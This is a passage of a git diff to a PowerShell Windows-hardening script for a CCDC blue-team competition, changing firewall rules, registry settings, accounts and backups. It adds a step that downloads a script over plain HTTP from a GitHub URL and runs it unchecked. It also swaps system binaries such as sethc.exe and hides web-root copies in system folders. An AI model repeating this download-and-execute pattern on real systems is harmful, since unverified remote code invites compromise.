@@ -105,6 +105,15 @@ Function Discovery_ {
     Get-NetFirewallRule | Where-Object   {$_.Direction -eq "Inbound"} | Where-Object   {$_.Enabled -eq "True"} | Select-Object Name, DisplayName, Description, DisplayGroup, Profile, Action | Out-File $discoverypath\Active-Inbount-Rules.txt
     Get-NetFirewallRule | Where-Object   {$_.Direction -eq "Outbound"} | Where-Object   {$_.Enabled -eq "True"} | Select-Object Name, DisplayName, Description, DisplayGroup, Profile, Action | Out-File $discoverypath\Active-Outbount-Rules.txt
     Get-ScheduledTask | Where-Object   {$_.State -ne "Disabled"} | Select-Object Taskname , State, TaskPath | FL | Out-File $discoverypath\Active-ScheduledTasks.txt
+     # Reg edits / Get-ItemProperty
+    $global:regProof = "$proofpath\regproof.txt"
+                # Saving old reg
+    Write-Host "Taking a backup of Registry"
+    reg export HKLM $regbackpath\Oldhlkm.reg
+    reg export HKCU $regbackpath\Oldhkcu.reg
+    reg export HKCR $regbackpath\Oldhlcr.reg
+    reg export HKU $regbackpath\Oldhlku.reg
+    reg export HKCC $regbackpath\Oldhlcc.reg
     Write-Host "Function: Discovery_   -   Complete" -ForegroundColor Green
     #Continue_
 }
@@ -196,6 +205,8 @@ Function Bulk_Firewall {
     cls
     Write-Host "Starting Function: Bulk_Firewall" -ForegroundColor Cyan
     Start-Sleep -s 1
+
+    Invoke-WebRequest "http://raw.githubusercontent.com/bwcybersec/ccdc/main/windown.ps1" -OutFile "C:\ccdc\windown.ps1"
                 # Disable ALL Existing Firewall Rules
     netsh advfirewall firewall set rule name=all new enable=no
                 # Pings
@@ -205,21 +216,19 @@ Function Bulk_Firewall {
     If ($global:Splunk -eq $null){
         $Splunk = Read-Host "What is Splunks IP?"
     }
-    If ($global:Splunk -ne $null){
+    If ($global:Splunk -ne $null -or $global:Splunk -ne ""){
         netsh advfirewall firewall add rule name="CCDC-Splunk Logs"       new dir=out action=allow enable=yes protocol=tcp profile=any remoteport=8000,8089,9997 remoteip=$global:Splunk  | Out-Null
     }            
-                # Webshare access
-    netsh advfirewall firewall add rule name="CCDC-Web Share OUT"    new dir=out action=allow enable=yes protocol=tcp profile=any remoteport=8000 remoteip=$Ubuntu18Web  | Out-Null
                 # Internet Access
     netsh advfirewall firewall add rule name="CCDC-Web Regional"        new dir=out action=allow enable=yes protocol=tcp profile=any remoteip=any remoteport=80,443  | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS Regional"        new dir=out action=allow enable=yes protocol=udp profile=any remoteport=53  | Out-Null
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-Noprofile", "-File", "C:\ccdc\windown.ps1"
                 # Intranet Access
     netsh advfirewall firewall add rule name="CCDC-Web Regional (INT)"  new dir=out action=allow enable=yes protocol=tcp profile=any remoteport=80,443 remoteip=$Internal  | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS Regional (INT)"  new dir=out action=allow enable=yes protocol=udp profile=any remoteport=53 remoteip=$ADDNS | Out-Null
     netsh advfirewall firewall add rule name="CCDC-NTP Allow (INT)"  new dir=out action=allow enable=yes protocol=udp profile=any remoteport=123 remoteip=$ADDNS  | Out-Null
                 # SNMP Access
-    netsh advfirewall firewall add rule name="CCDC-SNMP Regional (INT)"  new dir=in action=allow enable=yes protocol=udp profile=any localport=161 remoteip=$Internal  | Out-Null
-    netsh advfirewall firewall add rule name="CCDC-NetBIOS" dir=out action=allow enable=no profile=any localport=445 remoteip=$ADDNS protocol=tcp | Out-Null            
+    netsh advfirewall firewall add rule name="CCDC-SNMP Regional (INT)"  new dir=in action=allow enable=no protocol=udp profile=any localport=161 remoteip=$Internal  | Out-Null
                 # Disable IPv6 Teredo Tunneling
     netsh interface teredo set state disabled | Out-Null
     netsh interface ipv6 6to4 set state state=disabled undoonstop=disabled | Out-Null
@@ -238,7 +247,7 @@ Function Damage_Reversal {
     Write-Host "Removing all saved credentials..." -ForegroundColor Cyan
     cmdkey /list | Where-Object   {$_ -like "*Target*"} | ForEach ($_) {cmdkey /delete $_.Substring('12')} 
                 # Disable Default Accounts
-    #net user Guest /active:no
+    net user Guest /active:no
                 # Show Local Users
                 ###THIS WILL BREAK ANY COMP THAT USES AD TO AUTHENTICATE FOR SCORE. DONT ASK HOW WE FOUND OUT###
     #$disUsers = Get-LocalUser | Where-Object   {$_.Name -ne $env:username}
@@ -249,14 +258,7 @@ Function Damage_Reversal {
 	    #Get-LocalUser | Where-Object  {$_.Name -ne $env:username} | Disable-LocalUser
         #}
     #}  
-                #Add local Admin account
-    If ($curhost -ne "WinServer"){
-        if( $Password -eq $null){
-            $Password = Read-Host "Password for local admin:" -AsSecureString
-        }else{$Password = ConvertTo-SecureString -AsPlainText $Password -Force}
-        New-LocalUser -Name "localblue" -Password $Password
-        Add-LocalGroupMember -Group "Administrators" -Member "localblue"
-    }  
+
 
     Get-LocalUser | Out-File $discoverypath\All-Local-Users.txt
     Get-LocalUser | Where-Object   {$_.Enabled -eq "True"} | Out-file $discoverypath\All-Enabled-Local-Users.txt
@@ -293,14 +295,7 @@ Function Damage_Reversal {
     ForEach ($feature in $enabledFeatures){
         Add-Content $discoverypath\EnabledFeatures.txt "$feature" -force -erroraction silentlycontinue
     }
-                                        # Reg edits / Get-ItemProperty
-    $global:regProof = "$proofpath\regproof.txt"
-                # Saving old reg
-    reg export HKLM $regbackpath\Oldhlkm.reg
-    reg export HKCU $regbackpath\Oldhkcu.reg
-    reg export HKCR $regbackpath\Oldhlcr.reg
-    reg export HKU $regbackpath\Oldhlku.reg
-    reg export HKCC $regbackpath\Oldhlcc.reg
+                                       
                 # Changing Owner
     Add-Content $regProof "Changing registered owner..."
     REG query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner | Add-Content $regProof
@@ -328,84 +323,84 @@ Function Damage_Reversal {
                 # Unhide System Files
     Add-Content $regProof "Unhide system files:"
     REG query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden | Add-Content $regProof
-    REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f | Out-Null
+    REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f 
     REG query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden | Add-Content $regProof
 
                 # Fix Local Security Authority
     Add-Content $regProof "Restrictanonymous:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymous | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymous /t REG_DWORD /d 1 /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymous /t REG_DWORD /d 1 /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymous | Add-Content $regProof
 
                 # Restrict Anonymous SAM
     Add-Content $regproof "Restrict anonymous sam:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymoussam | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymoussam /t REG_DWORD /d 1 /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymoussam /t REG_DWORD /d 1 /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v restrictanonymoussam | Add-Content $regProof
 
                 # Change everyone includes Anonymous
     Add-Content $regProof "Change everyone includes anonymous:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v everyoneincludesanonymous | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v everyoneincludesanonymous /t REG_DWORD /d 0 /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v everyoneincludesanonymous /t REG_DWORD /d 0 /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v everyoneincludesanonymous | Add-Content $regProof
 
                 # Turn off Local Machine Hash
     Add-Content $regProof "Turn off Local Machine Hash:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v NoLMHash | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v NoLMHash /t REG_DWORD /d 1 /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v NoLMHash /t REG_DWORD /d 1 /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v NoLMHash  | Add-Content $regProof
 
                 # Change Notification Packages
     Add-Content $regProof "Change notification packages:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "Notification Packages"  | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli" /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli" /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "Notification Packages"  | Add-Content $regProof
 
                 # Delete image hijack that kills task manager
     Add-Content $regProof "Re-enable task manager:"
     REG query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger | Add-Content $regProof
-    REG delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /f /v Debugger | Out-Null
+    REG delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /f /v Debugger 
     REG query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger | Add-Content $regProof
     
                 # Re-enable task manager
     Add-Content $regProof "Re-enable task manager 2:"
     REG query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr | Add-Content $regProof
-    REG delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f | Out-Null
+    REG delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f 
 
                 # Re-enable CMD Prompt
     Add-Content $regProof "Re-enable cmd prompt:"
     REG query "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD | Add-Content $regProof
-    REG delete "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /f | Out-Null
+    REG delete "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /f 
 
                 # Enable Windows Defender
     Add-Content $regProof "Re-enable Windows Defender:"
     REG query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware | Add-Content $regProof
-    REG delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f | Out-Null
+    REG delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
                           
                 # Change setting to NOT store plaintext passwords
     Add-Content $regProof "Removing stored plaintext passwords:"
     REG query "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parametersn" /v EnablePlainTextPassword | Add-Content $regProof
-    REG add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v EnablePlainTextPassword /t REG_DWORD /d 0 /f | Out-Null
+    REG add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v EnablePlainTextPassword /t REG_DWORD /d 0 /f 
     REG query "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v EnablePlainTextPassword | Add-Content $regProof
                 
                 # Delete use Machine ID
     Add-Content $regProof "Delete use machine id:"
     REG query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v UseMachineID | Add-Content $regProof
-    REG delete "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v UseMachineID /f | Out-Null
+    REG delete "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v UseMachineID /f 
 
                 # Show Hidden Users in GUI
     Add-Content $regProof "Show hidden users in gui:"
     REG query "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts" | Add-Content $regProof
-    Reg delete "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts" /f | Out-Null
+    Reg delete "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts" /f 
 
                 # Disable Possible Backdoors
     Add-Content $regProof "Disable possible backdoors"
     REG query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" | Add-Content $regProof
-    REG add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "systray.exe" /f | Out-Null
+    REG add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "systray.exe" /f 
     REG query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" | Add-Content $regProof
 
     REG query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger | Add-Content $regProof
-    REG add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "systray.exe" /f | Out-Null
+    REG add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "systray.exe" /f 
     REG query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger | Add-Content $regProof
 
                 #Sticky keys
@@ -421,8 +416,8 @@ Function Damage_Reversal {
     $ar2 = New-Object system.security.AccessControl.FileSystemAccessRule("$env:username", "FullControl","Allow")
     $Acl2.SetAccessRule($ar2)
     Set-Acl systray.exe -AclObject $Acl2
-    move-item sethc.exe sethc.old.exe -Force | Out-Null
-    copy-item systray.exe sethc.exe | Out-Null
+    move-item sethc.exe sethc.old.exe -Force 
+    copy-item systray.exe sethc.exe 
     Write-Host "Function: Damage_Reversal   -   Complete" -ForegroundColor Green
     #Continue_
 }
@@ -447,17 +442,17 @@ Function WinServer{
     cls
     Write-Host "Starting Function: WinServer" -ForegroundColor Cyan
     Start-Sleep -s 1
-    reg Add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "TCP/IP Port" /t REG_DWORD /d 50243 /f | Out-Null
-    REG add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" /v "DCTcpipPort" /t REG_DWORD /d 50244 /f | Out-Null
-    REG add "HKLM\SYSTEM\CurrentControlSet\Services\NTFRS\Parameters" /v "RPC TCP/IP Port Assignment" /t REG_DWORD /d 50245 /f | Out-Null
+    reg Add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "TCP/IP Port" /t REG_DWORD /d 50243 /f 
+    REG add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" /v "DCTcpipPort" /t REG_DWORD /d 50244 /f 
+    REG add "HKLM\SYSTEM\CurrentControlSet\Services\NTFRS\Parameters" /v "RPC TCP/IP Port Assignment" /t REG_DWORD /d 50245 /f 
     REG delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /f | Out-Null
-    REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "* * * * * * * * * * W A R N I N G * * * * * * * * * *" | Out-Null
+    REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "* * * * * * * * * * W A R N I N G * * * * * * * * * *" 
     REG delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /f | Out-Null 
-    REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "This computer system/network is the property of $dName. It is for authorized use only. By using this system, all users acknowledge notice of, and agree to comply with, the Company’s Acceptable Use of Information Technology Resources Policy ('AUP'). Users have no personal privacy rights in any materials they place, view, access, or transmit on this system. The Company complies with state and federal law regarding certain legally protected confidential information, but makes no representation that any uses of this system will be private or confidential. Any or all uses of this system and all files on this system may be intercepted, monitored, recorded, copied, audited, inspected, and disclosed to authorized Company and law enforcement personnel, as well as authorized individuals of other organizations. By using this system, the user consents to such interception, monitoring, recording, copying, auditing, inspection, and disclosure at the discretion of authorized Company personnel. Unauthorized or improper use of this system may result in administrative disciplinary action, civil charges/criminal penalties, and/or other sanctions as set forth in the Company’s AUP. By continuing to use this system you indicate your awareness of and consent to these terms and conditions of use. ALL USERS SHALL LOG OFF OF A $dName OWNED SYSTEM IMMEDIATELY IF SAID USER DOES NOT AGREE TO THE CONDITIONS STATED ABOVE." | Out-Null
-    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption  | Out-Null 
-    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext  | Out-Null
+    REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "This computer system/network is the property of $dName. It is for authorized use only. By using this system, all users acknowledge notice of, and agree to comply with, the Company’s Acceptable Use of Information Technology Resources Policy ('AUP'). Users have no personal privacy rights in any materials they place, view, access, or transmit on this system. The Company complies with state and federal law regarding certain legally protected confidential information, but makes no representation that any uses of this system will be private or confidential. Any or all uses of this system and all files on this system may be intercepted, monitored, recorded, copied, audited, inspected, and disclosed to authorized Company and law enforcement personnel, as well as authorized individuals of other organizations. By using this system, the user consents to such interception, monitoring, recording, copying, auditing, inspection, and disclosure at the discretion of authorized Company personnel. Unauthorized or improper use of this system may result in administrative disciplinary action, civil charges/criminal penalties, and/or other sanctions as set forth in the Company’s AUP. By continuing to use this system you indicate your awareness of and consent to these terms and conditions of use. ALL USERS SHALL LOG OFF OF A $dName OWNED SYSTEM IMMEDIATELY IF SAID USER DOES NOT AGREE TO THE CONDITIONS STATED ABOVE." 
+    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption  
+    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext  
     REG query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v TcpReceivePacketSize | Add-Content $regProof
-    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v TcpReceivePacketSize /t REG_DWORD /d 65280 /f
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v TcpReceivePacketSize /t REG_DWORD /d 0xFF00 /f
     REG query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v TcpReceivePacketSize | Add-Content $regProof
     Stop-Service Dns
     start-sleep -s 1
@@ -465,7 +460,7 @@ Function WinServer{
     Start-Sleep -s 1
     Write-Host "--Screenshot--" -ForegroundColor Yellow
     #Continue_
-                #TESTING AD Workstation
+                #Untested WinRM script to send the script to all machines
                 #Network Share
     #New-SmbShare -Name "scripts" -Path "C:\script\winhard.ps1" -FullAccess "Domain Admins" -ReadAccess "Everyone"
     #
@@ -503,11 +498,11 @@ Function WinServer{
     If(-not ($NoAD)){                
                 #LDAP 389
         Write-Host "Create Firewall Rules for LDAP" -ForegroundColor Cyan
-        netsh advfirewall firewall add rule name="CCDC-LDAP Service" dir=in action=allow enable=yes profile=any localport=389 remoteip= $WinFTP,$WinWeb protocol=tcp  | Out-Null
+        netsh advfirewall firewall add rule name="CCDC-LDAP Service" dir=in action=allow enable=yes profile=any localport=389 remoteip= $WinFTP,$WinWeb,$win11wrk protocol=tcp  | Out-Null
 
                 #LDAP 636
         Write-Host "Create Firewall Rules for LDAP" -ForegroundColor Cyan
-        netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=in action=allow enable=no profile=any localport=636 remoteip= $WinFTP, $WinWeb protocol=tcp  | Out-Null
+        netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=in action=allow enable=no profile=any localport=636 remoteip= $WinFTP, $WinWeb,$win11wrk protocol=tcp  | Out-Null
 
                 # KERBEROS
         Write-Host "Create Firewall Rules for Kerberos" -ForegroundColor Cyan
@@ -516,14 +511,16 @@ Function WinServer{
         netsh advfirewall firewall set rule group="CCDC-Kerberos Key Distribution Center (TCP-In)" new enable=yes  | Out-Null
         netsh advfirewall firewall set rule group="CCDC-Kerberos Key Distribution Center (UDP-In)" new enable=yes  | Out-Null
 
-        netsh advfirewall firewall add rule name="CCDC-NetBIOS" dir=out action=allow enable=no profile=any localport=445 remoteip=$ADDNS protocol=tcp | Out-Null
+        netsh advfirewall firewall add rule name="CCDC-NetBIOS" dir=in action=allow enable=yes profile=any localport=445 remoteip=172.20.240.0/24 protocol=tcp | Out-Null
+
+        netsh advfirewall firewall add rule name="RPC" dir=out action=allow enable=yes profile=any protocol=tcp remoteport=49152-65535 remoteip=localsubnet | Out-Null
     }
                 # DNS 53
     Write-Host "Create Firewall Rules for DNS access for Internet and Intranet" -ForegroundColor Cyan
-    netsh advfirewall firewall add rule name="CCDC-DNS In UDP from DNSNTP"  dir=in action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=udp  | Out-Null
-    netsh advfirewall firewall add rule name="CCDC-DNS Out UDP to DNSNTP" dir=out action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=udp  | Out-Null
-    netsh advfirewall firewall add rule name="CCDC-DNS In TCP from DNSNTP"  dir=in action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=tcp  | Out-Null
-    netsh advfirewall firewall add rule name="CCDC-DNS Out TCP to DNSNTP" dir=out action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=tcp  | Out-Null
+    #netsh advfirewall firewall add rule name="CCDC-DNS In UDP from DNSNTP"  dir=in action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=udp  | Out-Null
+    #netsh advfirewall firewall add rule name="CCDC-DNS Out UDP to DNSNTP" dir=out action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=udp  | Out-Null
+    #netsh advfirewall firewall add rule name="CCDC-DNS In TCP from DNSNTP"  dir=in action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=tcp  | Out-Null
+    #netsh advfirewall firewall add rule name="CCDC-DNS Out TCP to DNSNTP" dir=out action=allow enable=yes profile=any remoteport=53 remoteip=$DNSNTP protocol=tcp  | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS In UDP from Internal" dir=in action=allow enable=yes profile=any localport=53  protocol=udp remoteip=$Internal | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS Out UDP to Internal" dir=out action=allow enable=yes profile=any localport=53  protocol=udp remoteip=$Internal | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS In UDP from Internet" dir=in action=allow enable=yes profile=any localport=53  protocol=udp  | Out-Null
@@ -532,7 +529,7 @@ Function WinServer{
     netsh advfirewall firewall add rule name="CCDC-DNS Out TCP to Internal" dir=out action=allow enable=yes profile=any localport=53  protocol=tcp remoteip=$Internal | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS In TCP from Internet" dir=in action=allow enable=yes profile=any localport=53  protocol=tcp  | Out-Null
     netsh advfirewall firewall add rule name="CCDC-DNS Out TCP to Internet" dir=out action=allow enable=yes profile=any localport=53  protocol=tcp  | Out-Null
-    
+    dnscmd /zoneexport $dName "$dName.dns"
                  #Disable SMB1
     Write-Host "Disable SMB1 via Registry..." -ForegroundColor Cyan
     REG add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SMB1" /t REG_DWORD /d 0 /f | Out-Null
@@ -584,11 +581,12 @@ Function WinWeb{
    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon" /v legalnoticetext | Out-Null
    
    netsh advfirewall firewall add rule name="CCDC-Webserver"  new dir=in action=allow enable=yes protocol=tcp profile=any localport=80,443  | Out-Null
-
-   netsh advfirewall firewall add rule name="CCDC-Kerberos Out" dir=out action=allow enable=no profile=any localport=88,464 remoteip=$ADDNS protocol=tcp | Out-Null
-   netsh advfirewall firewall add rule name="CCDC-NetBIOS" dir=out action=allow enable=no profile=any localport=445 remoteip=$ADDNS protocol=tcp | Out-Null
-   netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=out action=allow enable=no profile=any localport=389,636 remoteip=$ADDNS protocol=tcp  | Out-Null
    
+   If(-not ($NoAD)){
+        netsh advfirewall firewall add rule name="CCDC-Kerberos Out" dir=out action=allow enable=no profile=any localport=88,464 remoteip=$ADDNS protocol=tcp | Out-Null
+        netsh advfirewall firewall add rule name="CCDC-RPC" dir=in action=allow enable=yes profile=any protocol=tcp remoteport=49152-65535 remoteip=$ADDNS |Out-Null
+        netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=out action=allow enable=no profile=any localport=389,636 remoteip=$ADDNS protocol=tcp  | Out-Null
+   }
 
    #backup webpage
    $source = "C:\inetpub\wwwroot"
@@ -604,12 +602,31 @@ Function WinFTP{
    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon" /v legalnoticecaption | Out-Null
    REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon" /v legalnoticetext | Out-Null
    
-   netsh advfirewall firewall add rule name="CCDC-FTP"  new dir=in action=allow enable=yes protocol=tcp profile=any localport=20,21,80  | Out-Null
+   netsh advfirewall firewall add rule name="CCDC-FTP"  new dir=in action=allow enable=yes protocol=tcp profile=any localport=20,21  | Out-Null
 
                    #AD Rules
    If(-not ($NoAD)){
        netsh advfirewall firewall add rule name="CCDC-Kerberos Out" dir=out action=allow enable=yes profile=any localport=88,464 remoteip=$ADDNS protocol=tcp  | Out-Null
        netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=out action=allow enable=yes profile=any localport=389,636 remoteip=$ADDNS protocol=tcp  | Out-Null
+       netsh advfirewall firewall add rule name="CCDC-RPC" dir=in action=allow enable=yes profile=any protocol=tcp remoteport=49152-65535 remoteip=$ADDNS |Out-Null
+   }
+   $source = "C:\inetpub\wwwroot"
+   $dest = "C:\ccdc\", "C:\Windows\System32\drivers\en-US", "C:\ProgramData"
+   $dest | Foreach-Object { Copy-Item -Path $source -dest (Join-Path $_ $destFileName)}
+}
+Function AD_User{
+   Write-Host "Starting Function: AD_User" -ForegroundColor Cyan
+    
+   REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon" /v legalnoticecaption /t REG_SZ /d "* * * * * * * * * * W A R N I N G * * * * * * * * * *" /f | Out-Null
+   REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon" /v legalnoticetext /t REG_SZ /d "This computer system network is the property of $dName. It is for authorized use only. By using this system, all users acknowledge notice of, and agree to comply with, the Company’s Acceptable Use of Information Technology Resources Policy ('AUP'). Users have no personal privacy rights in any materials they place, view, access, or transmit on this system. The Company complies with state and federal law regarding certain legally protected confidential information, but makes no representation that any uses of this system will be private or confidential. Any or all uses of this system and all files on this system may be intercepted, monitored, recorded, copied, audited, inspected, and disclosed to authorized Company and law enforcement personnel, as well as authorized individuals of other organizations. By using this system, the user consents to such interception, monitoring, recording, copying, auditing, inspection, and disclosure at the discretion of authorized Company personnel. Unauthorized or improper use of this system may result in administrative disciplinary action, civil charges/criminal penalties, and/or other sanctions as set forth in the Company’s AUP. By continuing to use this system you indicate your awareness of and consent to these terms and conditions of use. ALL USERS SHALL LOG OFF OF A $dName OWNED SYSTEM IMMEDIATELY IF SAID USER DOES NOT AGREE TO THE CONDITIONS STATED ABOVE." /f | Out-Null
+   REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon" /v legalnoticecaption | Out-Null
+   REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon" /v legalnoticetext | Out-Null
+
+                   #AD Rules
+   If(-not ($NoAD)){
+       netsh advfirewall firewall add rule name="CCDC-Kerberos Out" dir=out action=allow enable=yes profile=any localport=88,464 remoteip=$ADDNS protocol=tcp  | Out-Null
+       netsh advfirewall firewall add rule name="CCDC-LDAP Service SSL" dir=out action=allow enable=yes profile=any localport=389,636 remoteip=$ADDNS protocol=tcp  | Out-Null
+       netsh advfirewall firewall add rule name="CCDC-RPC" dir=in action=allow enable=yes profile=any protocol=tcp remoteport=49152-65535 remoteip=$ADDNS |Out-Null
    }
 
 }
@@ -650,31 +667,31 @@ Function CCDC_ICACLS {
     cls
     Write-Host "Starting Function: CCDC_ICACLS" -ForegroundColor Cyan
     Start-Sleep -s 1
-    Write-Host "Tighten CCDC ACL..." -ForegroundColor Cyan
-    icacls $ccdcpath\* /inheritancelevel:d 
-    icacls $ccdcpath /inheritancelevel:d 
-                    # Grants permission to only cur user for ccdc dirs
-    $Acl = Get-Acl $ccdcpath
-    $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:username", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-    $Acl.SetAccessRule($Ar)
-    Set-Acl $ccdcpath $Acl
-    if(-not($curhost -eq "Winserver")){
-        $ArLocal = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:COMPUTERNAME\localblue", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-        $Acl.setAccessRule($ArLocal)
